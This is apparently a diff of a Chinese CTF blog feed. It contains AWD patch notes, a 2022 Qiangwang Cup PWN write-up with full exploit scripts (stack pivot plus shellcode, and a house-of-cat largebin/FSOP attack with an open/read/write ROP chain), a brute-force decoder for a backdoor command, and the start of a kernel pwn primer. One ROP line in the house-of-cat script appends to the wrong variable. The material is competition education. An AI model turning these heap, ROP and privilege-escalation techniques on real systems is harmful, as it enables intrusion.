+<figure data-type="image" tabindex="2"><img src="https://img.le1a.com/2022/08/23/e5d85e1db270c.png" alt="1661246997355.png" loading="lazy"></figure>
+<p>可以看出程序主逻辑是对一些特殊符号进行解释，然后对<code>unk_4098</code>这个地址的数据进行一系列的变换操作。</p>
+<p>看到exit(0)，以及libc是2.31，当时是盲猜了一手会去打ld上的<code>rtld_global</code>，在<code>_run_exit_hand</code>中劫持<code>exit hook</code>指针。所以就把exit给nop掉（以防万一，也把free给nop了）</p>
+<figure data-type="image" tabindex="3"><img src="https://img.le1a.com/2022/08/23/e58a19807e562.png" alt="1661247261632.png" loading="lazy"></figure>
+<p>（赛后问了出题人，打法是类似于今年qwb的qwarmup那题的，先丢这儿，过段时间看吧）</p>
+<h1 id="oldvm">oldvm</h1>
+<h2 id="fix-2">fix</h2>
+<p>类似于上一题，这道题也需要在main函数中简单修复一下switch跳表，</p>
+<figure data-type="image" tabindex="4"><img src="https://img.le1a.com/2022/08/23/b21e911b021a5.png" alt="1661247437875.png" loading="lazy"></figure>
+<p>然后这个附件是一个vm，进过初步分析发现，在函数<code>sub_1DD0</code>, <code>sub_1E80</code>, <code>sub_1F30</code>中，都有对传入的参数<code>a1</code>, <code>a2</code>, <code>a3</code>范围的检测。</p>
+<figure data-type="image" tabindex="5"><img src="https://img.le1a.com/2022/08/23/20c622d87fe67.png" alt="1661247593083.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://img.le1a.com/2022/08/23/6cd4d4ce2757a.png" alt="1661247624087.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="7"><img src="https://img.le1a.com/2022/08/23/944e104951a1c.png" alt="1661247653548.png" loading="lazy"></figure>
+<p>可是在<code>sub_1F30</code>中，缺少了对<code>a2</code>&lt;0这种情况的判断，会造成对<code>*(_DWORD *)(4LL * a2 + *(_QWORD *)(qword_5050 + 24))</code>地址非预期的访问。</p>
+<p>为了方便，我这里直接将判断<code>a3</code>&lt;0的分支改为了判断<code>a2</code>&lt;0，只修改1byte即可。</p>
+<figure data-type="image" tabindex="8"><img src="https://img.le1a.com/2022/08/23/4146620f12715.png" alt="1661247808960.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="9"><img src="https://img.le1a.com/2022/08/23/d2e7c258e41d8.png" alt="1661247829169.png" loading="lazy"></figure>
+<h1 id="mvvm">mvvm</h1>
+<h2 id="fix-3">fix</h2>
+<p>一个vm解释程序</p>
+<figure data-type="image" tabindex="10"><img src="https://img.le1a.com/2022/08/24/2b7230c3ac82d.png" alt="1661316287432.png" loading="lazy"></figure>
+<p>在readn的时候感觉是存在溢出的，因为size是0x100，里面是和0x1000判断的，但是由于溢出点在堆上，且后续并没有什么好触发的堆漏洞的函数，所以就没管了（前面交过一发nop free+修复堆溢出的，exp还是通过了）</p>
+<p>然后思路就断了，不过看到<code>init_io</code>中存在alarm函数，且时间设置的非常长。</p>
+<figure data-type="image" tabindex="11"><img src="https://img.le1a.com/2022/08/24/f9699d9b27bd0.png" alt="1661316628819.png" loading="lazy"></figure>
+<p>这里尝试着把参数改成了<code>0x5</code>，然后就fix通过了。</p>
+<p>猜测原因是功能check用时较短，且exp通过vm的运行时间较长，所以非预期fix了。</p>
+<p>(预期解的话是在<code>vm_exec</code>中，暂时还没有分析。这题还有一种非预期是上通防，这里给出一个较好用的通防脚本：https://github.com/TTY-flag/evilPatcher)</p>
+<h1 id="fmpfs">fmpfs</h1>
+<h2 id="fix-4">fix</h2>
+<p>该题实现了一个简单的文件系统，并且有一定的基本功能。</p>
+<figure data-type="image" tabindex="12"><img src="https://img.le1a.com/2022/08/24/8a64802773894.png" alt="1661316800085.png" loading="lazy"></figure>
+<p>发现在对文件加密和解密的过程中，调用了<code>sub_4032A5</code>这个函数，发现它存在逻辑漏洞</p>
+<figure data-type="image" tabindex="13"><img src="https://img.le1a.com/2022/08/24/c1fabf2965045.png" alt="1661317030891.png" loading="lazy"></figure>
+<p>当<code>v2</code>刚好等于128时，v5会是一个未被赋值的悬挂指针，然后再下一次使用<code>password</code>认证，就能劫持到该指针，造成任意内存写。</p>
+<figure data-type="image" tabindex="14"><img src="https://img.le1a.com/2022/08/24/fe6b5ce24460e.png" alt="1661317248584.png" loading="lazy"></figure>
+<p>直接将<code>v2</code>&gt;128这个判断给nop掉即可fix成功。</p>
+<h1 id="ezcgi">ezcgi</h1>
+<h2 id="fix-5">fix</h2>
+<figure data-type="image" tabindex="15"><img src="https://img.le1a.com/2022/09/02/b745ef41bd1c1.png" alt="1662096776496.png" loading="lazy"></figure>
+<p>一个路由器的cgi程序，由于代码量比较大，所以直接从敏感函数入手了。</p>
+<p>在函数<code>sub_461E</code>中有两个<code>mmap</code>语句</p>
+<figure data-type="image" tabindex="16"><img src="https://img.le1a.com/2022/09/02/087b1bdb7533b.png" alt="1662097776848.png" loading="lazy"></figure>
+<p>其中有一个权限给到了7，可能存在问题</p>
+<figure data-type="image" tabindex="17"><img src="https://img.le1a.com/2022/09/02/cc0209dccf18c.png" alt="1662097869538.png" loading="lazy"></figure>
+<p>这样就能通过fix检测了。</p>
+<h1 id="stream">stream</h1>
+<h2 id="fix-6">fix</h2>
+<p>在<code>do_write</code>函数中有一个size检测的逻辑漏洞</p>
+<figure data-type="image" tabindex="18"><img src="https://img.le1a.com/2022/09/02/498aaebce562a.png" alt="1662098314921.png" loading="lazy"></figure>
+<p>这里只检查了相应的指针是否存在，然后<code>nbytes</code>是否小于0x200。但是这个<code>nbytes</code>并没有和对应的stream当时open的大小进行比较，所以是存在溢出风险的。</p>
+<p>在<code>do_open</code>中最大能申请到的stream就是0x200，</p>
+<figure data-type="image" tabindex="19"><img src="https://img.le1a.com/2022/09/02/cb34dd226f26e.png" alt="1662098021871.png" loading="lazy"></figure>
+<p>这里我们可以直接给他patch为固定申请0x200。这样就能避免后面可能存在的溢出风险了。</p>
+<figure data-type="image" tabindex="20"><img src="https://img.le1a.com/2022/09/02/f3f583de7269a.png" alt="1662098699143.png" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[2022强网杯-PWN-WP]]></title>
+        <id>https://kotoriseed.github.io/post/强网杯2022/</id>
+        <link href="https://kotoriseed.github.io/post/强网杯2022/">
+        </link>
+        <updated>2022-07-31T04:26:58.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="devnull">devnull</h1>
+<h2 id="分析">分析</h2>
+<p>题目的libc_start_main需要glibc2.34+，所以在ubuntu21上打。</p>
+<p>main函数溢出点很明显，读了0x2c bytes，覆盖掉rbp后可以溢出0x8 bytes。</p>
+<figure data-type="image" tabindex="1"><img src="https://img.le1a.com/2022/07/31/2438410c865ac.png" alt="1659259085782.png" loading="lazy"></figure>
+<p>直接考虑栈迁移。</p>
+<figure data-type="image" tabindex="2"><img src="https://img.le1a.com/2022/07/31/9258eb4af205f.png" alt="1659259190674.png" loading="lazy"></figure>
+<p>这里我是迁移到.LOAD去了。</p>
+<p>溢出的时候要注意覆盖buf变量和fd变量（实际的栈布局和ida分析的稍有出入，需要自己调一下看），劫持第二次read，把之后布置的rop读到.LOAD中。</p>
+<p>这里进的是第25行的read，但是rdi此时是0，所以可以正常从stdin写数据。</p>
+<p>由于保护全开，不好从got表leak libc，但这个题存在<code>_mprotect</code>函数，可以用来修改某段内存的权限。</p>
+<p>在<code>sub_4012B6</code>中，存在可大量利用的代码片段</p>
+<figure data-type="image" tabindex="3"><img src="https://img.le1a.com/2022/07/31/a71105e71c157.png" alt="1659259672300.png" loading="lazy"></figure>
+<p>由于之前打印过<code>Thanks\n</code>，刚好７个字符，所以在call _mprotect的时候，edx其实就是7。</p>
+<p>不过rdi是由rax控制的，所以还需要找能控制rax的gadget。</p>
+<figure data-type="image" tabindex="4"><img src="https://img.le1a.com/2022/07/31/8af09be747f44.png" alt="1659259468454.png" loading="lazy"></figure>
+<p>这里将<code>[rbp-0x18]</code>赋值给了rax，所以只需要控制好rbp，在gadget中，让<code>rbp-0x18</code>处是.LOAD的起始地址就行。（这里卡了挺久，mprotect的addr参数，必须是页对齐的才行）。</p>
+<p>然后就正常布置rop，最后写shellcode，execve(&quot;/bin/sh\x00&quot;, 0, 0)即可getshell。（由于关闭了stdout，所以getshell之后还需要<code>exec 1&gt;&amp;2</code>重定位一下）</p>
+<h2 id="exp">exp</h2>
+<pre><code class="language-python">from pwn import *
+context.log_level = 'debug'
+context.arch = 'amd64'
+# p = process('./devnull')
+p = remote('123.56.45.155', 35339)
+elf = ELF('./devnull')
+
+load = 0x3fe000
+
+leave_ret = 0x0000000000401354 # leave ; ret
+mov_rax = 0x0000000000401350 # mov rax, qword ptr [rbp - 0x18] ; leave ; ret
+
+pay = cyclic(0x34) + p64(load)*2 + p64(leave_ret)
+p.recvuntil('filename')
+p.send(pay)
+
+pay = p64(load+0x28) + p64(mov_rax) + p64(load)*4 + p64(0x4012d0)
+pay += b'/bin/sh\x00' + p64(load+0x48)+asm(shellcraft.execve(load+0x38,0,0))
+
+p.recvuntil('new data')
+
+# gdb.attach(p)
+sleep(1)
+p.send(pay)
+
+p.interactive()
+
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://img.le1a.com/2022/07/31/f3bf50cbed816.png" alt="1659260216178.png" loading="lazy"></figure>
+<h1 id="house-of-cat">house of cat</h1>
+<h2 id="分析-2">分析</h2>
+<p>libc-2.35的菜单堆题，保护全开，沙箱禁用了<code>execve</code>，并且对fd有检查。</p>
+<p>每次循环都用<code>sub_155E</code>对<code>tcache_perthread_struct</code>进行了重新赋值，防止打tcache任意分配。</p>
+<figure data-type="image" tabindex="6"><img src="https://img.le1a.com/2022/08/12/42ac03fff04ba.png" alt="1660290997606.png" loading="lazy"></figure>
+<p>分析<code>sub_1DF3</code>发现，需要先在<code>sub_1A50</code>中将<code>sub_19D6</code>栈上的一个变量改为1来登录，之后才能进到堆块管理的功能中。</p>
+<p>而登录的payload其实很简单:</p>
+<pre><code>1. 包含`QWB`, `LOGIN`, `QWXF`, `admin`, `r00t`这些字段
+2. 在`LOGIN`后用` | `隔开
+3. `LOGIN`最先出现, 然后是`r00t`, 在`QWB`往后5位是`admin`
+</code></pre>
+<p>我最终使用的是</p>
+<pre><code>LOGIN | r00t QWB QWXFadmin
+</code></pre>
+<p>后续的菜单交互payload构造方法类似，就不作具体分析了</p>
+<p>菜单总体如下</p>
+<figure data-type="image" tabindex="7"><img src="https://img.le1a.com/2022/08/12/f5d9855063923.png" alt="1660294557739.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="https://img.le1a.com/2022/08/12/067c8612a7210.png" alt="1660296472805.png" loading="lazy"></figure>
+<p>add功能限制了chunk的size在0x420到0x470之间，都是largebin chunks的范围。</p>
+<figure data-type="image" tabindex="9"><img src="https://img.le1a.com/2022/08/12/32b9c86c4bbad.png" alt="1660296568387.png" loading="lazy"></figure>
+<p>delete直接白给uaf，肯定会从这里入手去leak和打largebin attack。</p>
+<figure data-type="image" tabindex="10"><img src="https://img.le1a.com/2022/08/12/f7b6f5fe08767.png" alt="1660296652790.png" loading="lazy"></figure>
+<p>show是直接write0x30个字节，不怕\x00的截断。</p>
+<figure data-type="image" tabindex="11"><img src="https://img.le1a.com/2022/08/12/1a014a46b33c3.png" alt="1660296750135.png" loading="lazy"></figure>
+<p>mini_edit限制了修改只能修改0x30，且次数受<code>dword_4010</code>的限制，只能修改2次。也就是说，最多完成2次largebin attack。不过这题的洞是uaf，操作的空间还是比较大的。</p>
+<p>leak部分没什么好说的，直接利用uaf得到heapbase和libcbase。</p>
+<p>第一个largebin attack我打的是<code>stderr</code>，因为这题没有显式调用exit，也不能从main函数返回，所以没法走fsop，需要利用<code>__malloc_assert</code>，（参考<code>house of kiwi</code>的触发方法，这里就不详细介绍了）</p>
+<p>IO利用链这里我是使用的<code>house of apple2</code>的方法，利用<code>_IO_wfile_overflow</code>。（其实也可以利用<code>_IO_wfile_jumps_mmap</code>或<code>_IO_wfile_jumps_maybe_mmap</code>，不过可能需要浅浅调一下偏移）</p>
+<pre><code class="language-c">wint_t
+_IO_wfile_overflow (FILE *f, wint_t wch)
+{
+  if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */
+    {
+      f-&gt;_flags |= _IO_ERR_SEEN;
+      __set_errno (EBADF);
+      return WEOF;
+    }
+  /* If currently reading or no buffer allocated. */
+  if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0)
+    {
+      /* Allocate a buffer if needed. */
+      if f-&gt;_wide_data-&gt;_IO_write_base == 0
+    {
+      _IO_wdoallocbuf (f); // 进此分支
+      // ......
+    }
+    }
+}
+</code></pre>
+<p>这里需要满足：</p>
+<ol>
+<li><code>(f-&gt;_flags &amp; _IO_NO_WRITES) == 0</code></li>
+<li><code>(f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0</code></li>
+<li><code>(f-&gt;_wide_data-&gt;_IO_write_base == 0)</code></li>
+</ol>
+<p>在<code>_IO_wdoallocbuf</code>中，有</p>
+<pre><code class="language-c">void
+_IO_wdoallocbuf (FILE *fp)
+{
+  if (fp-&gt;_wide_data-&gt;_IO_buf_base)
+    return;
+  if (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))
+    if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF) // 进此分支控制rip
+      return;
+  _IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf,
+             fp-&gt;_wide_data-&gt;_shortbuf + 1, 0);
+}
+libc_hidden_def (_IO_wdoallocbuf)
+</code></pre>
+<p>这里需要满足：</p>
+<ol>
+<li><code>(fp-&gt;_wide_data-&gt;_IO_buf_base) == 0</code></li>
+<li><code>(fp-&gt;_flags &amp; _IO_UNBUFFERED) == 0</code></li>
+</ol>
+<p>然后就会调用<code>(wint_t)_IO_WDOALLOCATE (fp)</code>, 即<code>*(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)</code></p>
+<p>综上，<code>fake_stderr</code>需要满足的条件如下：</p>
+<ol>
+<li>如果不需要直接getshell，那么<code>fp-&gt;_flags</code>设置为0即可（满足<code>~(0x2 | 0x8 | 0x800)</code>）</li>
+<li><code>fp-&gt;vtable</code>设为<code>_IO_wfile_jumps</code></li>
+<li><code>fp-&gt;_wide_data</code>设置为某个可控地址<code>A</code>，（<code>*(fp + 0xa0) = A</code>）</li>
+<li><code>fp-&gt;_wide_data-&gt;_IO_write_base</code>设置为0，（<code>*(A + 0x18) = 0</code>）</li>
+<li><code>fp-&gt;_wide_data-&gt;_IO_buf_base</code>设置为0，（<code>*(A + 0x30) = 0</code>）</li>
+<li><code>fp-&gt;_wide_data-&gt;_wide_vtable</code>设置为可控地址<code>B</code>，（<code>*(A + 0Xe0) = B</code>）</li>
+<li><code>fp-&gt;_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为想要劫持rip到的地址，（<code>*(B + 0x68) = rip</code>）</li>
+</ol>
+<p>由于还会调用<code>__xfprintf</code>，其中有一个<code>_IO_flockfile</code>的宏，还需要满足<code>fp-&gt;_lock</code>为一个可写地址。</p>
+<p>触发<code>__malloc_assert</code>这题应该至少有两个做法，一个是再利用一次largebin attack去打<code>&amp;topsize+7</code>，修改到topsize为某个堆地址的最低一字节（要保证大于<code>0x20</code>），还有一个就是构造heap overlap，直接修改到topsize。这里我使用的是后者，所以也节约了一次largebin attack。（所以这题应该也是可以用house of emma梭的，只是能不打TLS就别打hhh）</p>
+<p>构造overlap的方法就是造3个与top chunk紧邻的chunk，两个0x450（A, B），另一个作为防止直接于topchunk合并的gap（C），然后free掉A和B，重新分配为一个0x440（C）和一个0x460（D），这个时候就能改到之前的chunk B的chunk size，我们修改他为0x8c1，此时利用uaf，再次free掉chunk B，这个时候topchunk就合并上来了。然后free掉chunk D，重新申请就能改到topchunk的size。</p>
+<p>剩下的就没什么好说的了，就是要注意在open之前先close(0)，让open(&quot;flag&quot;, 0)分配到的fd为0，通过沙箱的检查，然后直接用libc的open会被kill掉，这里可以用syscall来调用。</p>
+<p>（exp比较难看，<code>SigreturnFrame</code>和<code>_wide_vtable</code>我是直接空间复用了，因为<code>_IO_WDOALLOCATE</code>劫持到rip的时候，rdx刚好在那个chunk的地址，所以就凑合着用了。）</p>
+<h2 id="exp-2">exp</h2>
+<pre><code class="language-python">from pwn import *
+context(os='linux', arch='amd64', log_level='debug')
+elf = ELF('./house_of_cat')
+libc = elf.libc
+p = process('./house_of_cat')
+
+sla = lambda x,y : p.sendlineafter(x, y)
+sa  = lambda x,y : p.sendafter(x, y)
+sd  = lambda x   : p.send(x)
+sl  = lambda x   : p.sendline(x)
+rl  = lambda     :p.recvline()
+ru  = lambda x   : p.recvuntil(x)
+
+def choice(idx):
+	sa('~~~\n', 'CAT | r00t QWB QWXF$\xff')
+	sla('choice:', str(idx))
+
+def add(idx, size, content='ababab'):
+	choice(1)
+	sla('idx:', str(idx))
+	sla('size:', str(size))
+	if idx!=14:
+		sa('content:', content)
+
+def delete(idx):
+	choice(2)
+	sla('idx:', str(idx))
+
+def show(idx):
+	choice(3)
+	sla('idx', str(idx))
+
+def edit(idx, content):
+	choice(4)
+	sla('idx', str(idx))
+	sa('content:', content)
+
+def getshell():
+	sleep(0.1)
+	p.interactive()
+
+def main():
+	sa('~~~\n', 'LOGIN | r00t QWB QWXFadmin')
+	add(0, 0x420) # A
+	wide_data = p64(0)*4
+	add(15, 0x450) # gap
+	add(1, 0x418) # B
+	add(2, 0x450) # gap
+	delete(0)
+	add(3, 0x450)
+	show(0) # leak
+	ru('text:\n')
+	libcbase = u64(p.recv(8)) - 0x21a0d0
+	p.recv(8)
+	heapbase = u64(p.recv(8))&gt;&gt;12
+	print(hex(libcbase))
+	print(hex(heapbase))
+	stderr = libcbase + libc.symbols['stderr']
+	print(hex(stderr))
+	delete(1)
+	fake_stderr = p64(0)
+	fake_stderr = fake_stderr.ljust(0x78, b'\x00')
+	fake_stderr += p64((heapbase&lt;&lt;12)) # _lock
+	fake_stderr = fake_stderr.ljust(0x90, b'\x00')
+	fake_stderr += p64((heapbase&lt;&lt;12)+0x1c60) # _wide_data
+	fake_stderr = fake_stderr.ljust(0xc8, b'\x00')
+	fake_stderr += p64(libcbase + 0x2160c0) # _IO_wfile_jumps
+	add(5, 0x418, fake_stderr)
+	delete(5)
+	pay = p64(libcbase+0x21a0d0)*2
+	pay += p64((heapbase&lt;&lt;12)^0x290) + p64(stderr-0x20)
+	edit(0, pay)
+	# gdb.attach(p)
+	add(4, 0x450) # largebin attack stderr
+	setcontext = libcbase + libc.symbols['setcontext']
+	wide_data = p64(0) * 13
+	wide_data += p64(0)*2 + p64(0x20) # rdx
+	wide_data += p64(0)*2 + p64((heapbase&lt;&lt;12)+0x2158) # rsp
+	wide_data += p64(libcbase + 0x000000000002a3e5 + 1) # rip
+	wide_data = wide_data.ljust(0xd0, b'\x00')
+	wide_data += p64((heapbase&lt;&lt;12)+0x20c0) # wide_vtable_address
+	add(6, 0x450, wide_data) # AA
+	wide_vtable = p64(0)
+	wide_vtable = wide_vtable.ljust(0x58, b'\x00')
+	wide_vtable += p64(setcontext+61)
+	close = libcbase + libc.symbols['close']
+	# open =  libcbase + libc.symbols['open']
+	read =  libcbase + libc.symbols['read']
+	write = libcbase + libc.symbols['write']
+	syscall_ret = libcbase + 0x0000000000091396 # syscall ; ret
+	pop_rax = libcbase + 0x0000000000045eb0 #  pop rax ; ret
+	pop_rdi = libcbase + 0x000000000002a3e5 # pop rdi ; ret
+	pop_rsi = libcbase + 0x000000000002be51 # pop rsi ; ret
+	rop = b'flag\x00\x00\x00\x00' + p64(0)*4
+	rop += p64(pop_rdi) + p64(0) + p64(close)
+	rop += p64(pop_rdi) + p64((heapbase&lt;&lt;12)+0x2130)
+	pay += p64(pop_rax) + p64(2) + p64(syscall_ret)
+	rop += p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64((heapbase&lt;&lt;12)+0x2140) + p64(read)
+	rop += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64((heapbase&lt;&lt;12)+0x2140) + p64(write)
+	add(7, 0x450, wide_vtable + rop) # BB
+	add(8, 0x450)
+	add(9, 0x450)
+	add(10, 0x450) # gap
+	delete(8)
+	delete(9)
+	add(11, 0x440)
+	pay = p64(0) + p64(0x460+0x461)
+	add(12, 0x460, pay)
+	delete(9)
+	delete(12)
+	pay = p64(0) + p64(0x50) # hijack topsize
+	add(13, 0x460, pay)
+	# gdb.attach(p, 'b *__malloc_assert')
+	# raw_input()
+	add(14, 0x450) # __malloc_assert
+	getshell()
+
+if __name__ == '__main__':
+	main()
+
+</code></pre>
+<figure data-type="image" tabindex="12"><img src="https://img.le1a.com/2022/08/14/975c8130c8899.png" alt="1660485670538.png" loading="lazy"></figure>
+<h1 id="yakagame">yakagame</h1>
+<h2 id="分析-3">分析</h2>
+<p>题目给了<code>opt-8</code>和<code>yaka.so</code>，显然是道llvm pass类的pwn题。（至于llvm pass是啥，我后面再单独出一篇文章讲讲吧）</p>
+<p>查一下<code>opt-8</code>的保护，可以看到差不多只开了NX，利用形式就很多了</p>
+<figure data-type="image" tabindex="13"><img src="https://img.le1a.com/2022/08/30/5b078d66cad2c.png" alt="1661828154179.png" loading="lazy"></figure>
+<p><code>yaka.so</code>直接ida开始分析</p>
+<figure data-type="image" tabindex="14"><img src="https://img.le1a.com/2022/08/30/9b71bdb2e1b11.png" alt="1661827232637.png" loading="lazy"></figure>
+<p>首先在虚函数表中找到他重写的<code>runOnFunction</code>函数（一般来说<code>runOnFunction</code>一定在虚函数表的最后），在这题就是<code>sub_C880</code>这个函数，跟进去分析。</p>
+<p>可以看到需要用gamestart函数作为主函数，然后调用一些特殊函数名来进行对应的游戏操作，最终通过fight打败boss取得分数。（具体功能这里就不浪费篇幅讨论了）</p>
+<p>分数达到<code>0x12345678</code>过后会有一个后门</p>
+<figure data-type="image" tabindex="15"><img src="https://img.le1a.com/2022/09/02/09b5dfa683188.png" alt="1662099608138.png" loading="lazy"></figure>
+<p>在后门中可以直接执行<code>system(cmd)</code></p>
+<p>这个<code>cmd</code>的来源如下，</p>
+<figure data-type="image" tabindex="16"><img src="https://img.le1a.com/2022/09/02/478eac56ce997.png" alt="1662105456396.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="17"><img src="https://img.le1a.com/2022/09/02/8aba753e70717.png" alt="1662105510236.png" loading="lazy"></figure>
+<p>src长度为8，解密后极有可能是<code>cat flag</code>这8个字符。</p>
+<p>再看看涉及到解密的代码部分，</p>
+<figure data-type="image" tabindex="18"><img src="https://img.le1a.com/2022/09/02/29d400de5ca3f.png" alt="1662105853650.png" loading="lazy"></figure>
+<p>当函数名为以上四个的时候，可以对<code>cmd</code>进行一个逐位的操作。</p>
+<p>现在来写代码暴力破解一下这个解密操作。</p>
+<p>先用idapython提取src的每一位（手动复制也行，我太懒了）</p>
+<figure data-type="image" tabindex="19"><img src="https://img.le1a.com/2022/09/02/3067a0c12b7ee.png" alt="1662106272161.png" loading="lazy"></figure>
+<p>写了个dfs暴力跑解密顺序，</p>
+<pre><code class="language-c++">#include&lt;cstdlib&gt;
+#include&lt;cstdio&gt;
+#include&lt;cstring&gt;
+#include&lt;iostream&gt;
+#define per(i, a, b) for (int i = a; i &lt;= b; ++i)
+#define rep(i, a, b) for (int i = a; i &gt;= b; --i)
+
+using namespace std;
+
+unsigned char cmd[1&lt;&lt;4] = {0x92, 0x68, 0x7b, 0x27, 0x6d, 0x93, 0x68, 0x66};
+int op[1&lt;&lt;10];
+void wuxiangdeyidao(unsigned char tmp[]){
+    per(i,0,7)
+        tmp[i]^=0x14u;
+}
+void zhanjinniuza(unsigned char tmp[]){
+    per(i,0,7)
+        tmp[i]^=0x7fu;
+}
+void guobapenhuo(unsigned char tmp[]){
+    per(i,0,7)
+        tmp[i]-=9u;
+}
+void tiandongwanxiang(unsigned char tmp[]){
+    per(i,0,7)
+        tmp[i]+=2u;
+}
+void (*func[1&lt;&lt;2])(unsigned char*) = {wuxiangdeyidao, zhanjinniuza, guobapenhuo, tiandongwanxiang};
+void dfs(unsigned char tmp[], int t){
+    if(t&gt;10)  return;
+    unsigned char tmp_t[1&lt;&lt;4] = {};
+    per(i,0,3){
+        memcpy(tmp_t, tmp, 0x9);
+        (*func[i])(tmp_t);
+        op[t] = i;
+        if(!strcmp((char *)tmp_t, &quot;cat flag&quot;)){
+            per(j,0,t)  cout&lt;&lt;op[j]&lt;&lt;&quot; &quot;;
+            exit(0);
+        }
+        else
+            dfs(tmp_t, t+1);
+    }
+}
+int main(){
+    unsigned char tmp[1&lt;&lt;4] = {};
+    memcpy(tmp, cmd, 0x9);
+    dfs(tmp, 0);
+    return 0;
+}
+</code></pre>
+<figure data-type="image" tabindex="20"><img src="https://img.le1a.com/2022/09/02/1f574bbb34105.png" alt="1662108699227.png" loading="lazy"></figure>
+<p>最终得到的顺序是:</p>
+<pre><code>0 0 0 0 0 0 3 0 2 0
+</code></pre>
+<p>由于<code>wuxiangdeyidao</code>是异或操作，所以我可以对这个结果手动简化一下变成:</p>
+<pre><code>3 0 2 0
+</code></pre>
+<p>即，</p>
+<pre><code>tiandongwanxiang, wuxiangdeyidao, guobapenhuo, wuxiangdeyidao
+</code></pre>
+<p>这样就能把cmd还原为<code>cat flag</code>了</p>
+<p>现在来分析一下如何触发后门。</p>
+<p>在gamestart函数中调用特定函数，会触发特定的处理流程。<code>fight</code>, <code>merge</code>, <code>destroy</code>, <code>upgrade</code>和刚刚解密<code>cmd</code>分析到的四个函数以外，如果再遇到新的函数（这些函数的参数个数都要按照要求来定义），将会在map中存入新的键值对。</p>
+<figure data-type="image" tabindex="21"><img src="https://img.le1a.com/2022/09/02/9149361b55bfa.png" alt="1662130301623.png" loading="lazy"></figure>
+<p>而<code>weaponlist</code>的索引<code>v33</code>是个char类型的变量，</p>
+<figure data-type="image" tabindex="22"><img src="https://img.le1a.com/2022/09/02/6728d1fc3382d.png" alt="1662129601859.png" loading="lazy"></figure>
+<p>而bss段里面<code>weaponlist</code>的低位刚好又是<code>score</code>的指针，所以我们可以构造大于255个函数，让<code>v33</code>溢出为负数，且再次调用其中某些函数刚好能劫持到<code>score</code>指针的某几个字节（正好程序没有打开pie保护），从而让后门大开。</p>
+<figure data-type="image" tabindex="23"><img src="https://img.le1a.com/2022/09/02/fffa6df5a3bdd.png" alt="1662129714788.png" loading="lazy"></figure>
+<p>由于map内部会对key进行排序，所以自定义函数的名字要注意按字典序递增。</p>
+<p>然后具体的偏移量要稍微用gdb调试一下。</p>
+<p>（待更新）</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Kernel PWN BASIC]]></title>
+        <id>https://kotoriseed.github.io/post/kernel pwn入门/</id>
+        <link href="https://kotoriseed.github.io/post/kernel pwn入门/">
+        </link>
+        <updated>2022-06-28T04:26:22.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="basic">BASIC</h1>
+<h2 id="environment">environment</h2>
+<p>在学习kernel pwn之前，需要搭建好很多前置环境</p>
+<ul>
+<li>qemu</li>
+<li>busybox</li>
+<li>编译linux内核（可选）</li>
+</ul>
+<p>至于具体的安装过程及其可能会遇到的报错请自行百度解决 <del>（主要是我也被折磨了hhh）</del></p>
+<h2 id="文件系统">文件系统</h2>
+<p>kernel题一般都会给出一个打包好的文件系统，因此需要掌握常用到的打包/解包命令</p>
+<pre><code class="language-shell">find . | cpio -o --format=newc &gt; ./rootfs.cpio
+cpio -idmv &lt; ./rootfs.cpio
+</code></pre>
+<p>（有时解包出来很奇怪，可能是原始cpio文件其实是以gz格式压缩后的，先gunzip解压一遍）</p>
+<h2 id="cred结构体">cred结构体</h2>
+<p>kernel使用cred结构体记录了进程的权限，如果能劫持或伪造cred结构体，就能改变当前进程的权限。</p>
+<p>原型如下：</p>
+<pre><code class="language-c">struct cred {
+	atomic_t	usage;
+#ifdef CONFIG_DEBUG_CREDENTIALS
+	atomic_t	subscribers;	/* number of processes subscribed */
+	void		*put_addr;
+	unsigned	magic;
+#define CRED_MAGIC	0x43736564
+#define CRED_MAGIC_DEAD	0x44656144
+#endif
+	kuid_t		uid;		/* real UID of the task */
+	kgid_t		gid;		/* real GID of the task */
+	kuid_t		suid;		/* saved UID of the task */
+	kgid_t		sgid;		/* saved GID of the task */
+	kuid_t		euid;		/* effective UID of the task */
+	kgid_t		egid;		/* effective GID of the task */
+	kuid_t		fsuid;		/* UID for VFS ops */
+	kgid_t		fsgid;		/* GID for VFS ops */
+	unsigned	securebits;	/* SUID-less security management */
+	kernel_cap_t	cap_inheritable; /* caps our children can inherit */
+	kernel_cap_t	cap_permitted;	/* caps we're permitted */
+	kernel_cap_t	cap_effective;	/* caps we can actually use */
+	kernel_cap_t	cap_bset;	/* capability bounding set */
+	kernel_cap_t	cap_ambient;	/* Ambient capability set */
+#ifdef CONFIG_KEYS
+	unsigned char	jit_keyring;	/* default keyring to attach requested
+					 * keys to */
+	struct key __rcu *session_keyring; /* keyring inherited over fork */
+	struct key	*process_keyring; /* keyring private to this process */
+	struct key	*thread_keyring; /* keyring private to this thread */
+	struct key	*request_key_auth; /* assumed request_key authority */
+#endif
+#ifdef CONFIG_SECURITY
+	void		*security;	/* subjective LSM security */
+#endif
+	struct user_struct *user;	/* real user ID subscription */
+	struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
+	struct group_info *group_info;	/* supplementary groups for euid/fsgid */
+	struct rcu_head	rcu;		/* RCU deletion hook */
+} __randomize_layout;
+</code></pre>
+<p>一般而言，我们需要想办法将uid和gid设置为0（root的uid和gid均为0）</p>
+<p>如果能劫持到程序流程，执行以下函数也可以达到相同效果：</p>
+<pre><code class="language-c">commit_creds(prepare_kernel_cred(0));
+</code></pre>
